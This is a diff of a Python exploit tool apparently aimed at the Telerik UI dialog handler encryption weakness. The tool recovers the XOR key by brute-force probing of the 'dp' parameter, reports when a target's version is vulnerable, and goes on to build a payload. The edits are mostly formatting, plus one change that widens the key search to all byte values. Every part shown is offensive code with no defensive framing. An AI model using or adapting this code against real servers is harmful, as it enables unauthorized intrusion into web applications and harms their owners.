@@ -1,16 +1,14 @@
+import re
+import sys
 import string
-from datetime import datetime
-import itertools
 import base64
 import requests
+import itertools
 from lib.constants import *
-import sys
-import re
-
+from datetime import datetime
 
 def byte_xor(ba1, ba2):
     return bytes([b1 ^ b2 for b1, b2 in zip(ba1, ba2)])
-
 
 def repeated_key_xor(pt, key):
 
@@ -20,17 +18,14 @@ def repeated_key_xor(pt, key):
         encoded.append(pt[i] ^ key[i % len_key])
     return bytes(encoded)
 
-
 def isB64Character(testByte):
     if ord(testByte) in b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789/+=":
         return True
     else:
         return False
 
-
 def is_hex(s):
     return re.fullmatch(r"^[0-9a-fA-F]$", s or "") is not None
-
 
 class CryptOMG:
     def __init__(
@@ -57,9 +52,7 @@ class CryptOMG:
         self.last_request = ""
         self.detector_byte = ""
         self.finalkey = ""
-
         self.mthlock = None
-
         self.debug = debug
         self.url = url
         self.handler = handler
@@ -97,17 +90,14 @@ class CryptOMG:
                     self.solveBlock()
                     if len(b"".join(self.solved_blocks)) == self.length:
                         break
-                #   self.msgPrint("Current Key Progress: [" + b''.join(self.solved_blocks).hex() + "]",style="success")
 
                 finalkey = b"".join(self.solved_blocks)
                 self.finalkey = finalkey
                 self.msgPrint("Found final key! [" + finalkey.hex() + "]", style="success")
                 self.findKeyComplete = True
-            # return finalkey
 
             else:
                 self.msgPrint("Starting with known key, skipping to payload generation")
-
             self.generate_payload()
         except Exception as e:
             self.msgPrint(e, style="error")
@@ -144,7 +134,6 @@ class CryptOMG:
             full_url = f"{self.url}{telerik_params}&dp={ciphertextB64}"
 
             r = self.versionProbe(full_url, version)
-
             if r.status_code == 200 and b"Error" not in r.content:
                 self.msgPrint(f"Vulnerable component confirmed! Version is: {[version]}", style="success")
                 self.exploit_url = full_url
@@ -159,7 +148,6 @@ class CryptOMG:
         headers = {}
         if self.cookie:
             headers["cookie"] = self.cookie
-
         self.request_count += 1
         self.terminal.footer_draw()
         r = requests.get(fullurl, headers=headers, verify=False, proxies=self.proxy)
@@ -210,7 +198,6 @@ class Block:
     def sendProbe(self, randBytes, additionalParams=None):
 
         self.parent.detector_byte = randBytes.hex()
-
         self.parent.request_count += 1
         self.parent.terminal.footer_draw()
         encryptedPrefix = byte_xor(b"A" * len(self.prefix), self.prefix)
@@ -306,7 +293,6 @@ class Block:
     def equals_check(self):
         self.parent.msgPrint("Attempting to perform check for [=] character")
 
-        #  print(self.baseline[0])
         # we might have an = in the 3/4 slots
         if self.baseline[2:] == b"\x00\x00":
             self.equals_check_34()
@@ -340,7 +326,6 @@ class Block:
         self.parent.msgPrint(f"Try all character mode (-a) if currently in ASCII Printable mode", style="error")
         sys.exit()
 
-
 class KeyPosition:
     def __init__(self, pos, parent):
         self.parent = parent
@@ -348,8 +333,8 @@ class KeyPosition:
         self.pos = pos
         self.possible_values = []
 
-        for s in string.printable:
-            self.possible_values.append(ord(s))
+        for i in range(256):
+            self.possible_values.append(i)
 
     def solve_byte(self):
 
